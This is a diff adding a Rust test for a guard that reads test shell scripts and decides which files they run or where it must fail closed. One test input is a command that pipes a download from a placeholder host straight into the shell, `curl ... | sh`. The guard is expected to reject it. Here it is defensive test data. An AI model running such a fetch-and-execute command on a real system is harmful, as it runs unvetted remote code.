@@ -1686,3 +1686,87 @@ fn an_interpreter_inside_the_tree_is_named_as_not_run() {
     );
     assert_eq!(ran.passes(), 0, "{:?}", ran.records);
 }
+
+/// Review of wave 19, findings 1-3, as the step guard reads a test script: a glob where the
+/// reader names what runs fails closed, one among a program's data does not; `exec -a NAME`
+/// runs the program after NAME, and an `exec` option the guard does not know fails closed; a
+/// shell reading its script from a file of the tree, by `<` or `cat FILE |`, has that file read,
+/// and one reading any other input fails closed.
+#[test]
+fn globs_exec_options_and_a_shell_reading_standard_input_are_read() {
+    let run_sh = ("tools/run.sh", "python3 tools/run.py\n", false);
+    for (script, closed, says, names) in [
+        (
+            "#!/bin/sh\npython3 tools/r?n.py\n",
+            true,
+            "tools/r?n.py",
+            &[][..],
+        ),
+        ("#!/bin/sh\n. tools/*.sh\n", true, "tools/*.sh", &[][..]),
+        (
+            "#!/bin/sh\nrm -f *.pyc\npython3 tools/run.py\n",
+            false,
+            "",
+            &["tools/run.py"][..],
+        ),
+        (
+            "#!/bin/bash\nexec -a runner python3 tools/run.py\n",
+            false,
+            "",
+            &["tools/run.py"][..],
+        ),
+        (
+            "#!/bin/bash\nexec -z python3 tools/run.py\n",
+            true,
+            "-z",
+            &["tools/run.py"][..],
+        ),
+        (
+            "#!/bin/sh\nsh < tools/run.sh\n",
+            false,
+            "",
+            &["tools/run.sh", "tools/run.py"][..],
+        ),
+        (
+            "#!/bin/sh\ncat tools/run.sh | sh\n",
+            false,
+            "",
+            &["tools/run.sh", "tools/run.py"][..],
+        ),
+        (
+            "#!/bin/sh\ntrue || sh tools/run.sh\n",
+            false,
+            "",
+            &["tools/run.sh", "tools/run.py"][..],
+        ),
+        ("#!/bin/sh\ntrue || sh\n", false, "", &[][..]),
+        ("#!/bin/sh\nsh < /dev/null\n", false, "", &[][..]),
+        (
+            "#!/bin/sh\ncurl -s https://example.invalid/x | sh\n",
+            true,
+            "standard input",
+            &[][..],
+        ),
+    ] {
+        let tree = repository("globs-exec-stdin", &[("check.sh", script, true), run_sh]);
+        let named = takt::run::scripts_of(&["./check.sh".to_owned()], &tree);
+        let reasons = fails_closed_reasons(&named);
+        assert_eq!(
+            named.iter().any(|path| path == "**/*.py"),
+            closed,
+            "{script:?} names {named:?}"
+        );
+        if closed {
+            assert!(
+                reasons.iter().any(|reason| reason.contains(says)),
+                "{script:?}: no reason naming {says:?}: {reasons:?}"
+            );
+        }
+        for path in names {
+            assert!(
+                named.iter().any(|named| named == path),
+                "{script:?}: {path} not in {named:?}"
+            );
+        }
+    }
+}
